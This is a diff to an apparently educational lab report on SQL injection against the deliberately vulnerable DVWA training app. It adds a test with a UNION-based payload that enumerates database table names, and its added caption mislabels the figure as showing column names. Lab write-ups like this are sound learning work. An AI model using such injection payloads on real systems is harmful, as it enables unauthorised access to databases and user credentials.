@@ -65,6 +65,27 @@ The DVWA security level was configured to Low to simulate real-world scenarios. 
 
 
 ---
+
+
+### Test 3: Enumeration of Table Names of the Database
+
+- **Payload Used:**
+  ```sql
+  1' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database()-- -
+    ```
+
+- **Steps Taken:**
+  1. Inject the payload into the User ID input.
+
+- **Results:**
+  - Table names such as `users`, `guestbook` are revealed.
+
+![Figure 3](../assets/sqli-enum-table-names.png)
+
+**Figure 3:** Column names displayed
+
+
+---
 ### Test 4: Enumeration of Column Names from Users Table
 
 - **Payload Used:**
@@ -78,7 +99,7 @@ The DVWA security level was configured to Low to simulate real-world scenarios. 
 - **Results:**
   - Column names such as `user`, `password` are revealed.
 
-![Figure 3](../assets/sqli-enum-column-names.png)
+![Figure 4](../assets/sqli-enum-column-names.png)
 **Figure 4:** Column names displayed
 
 
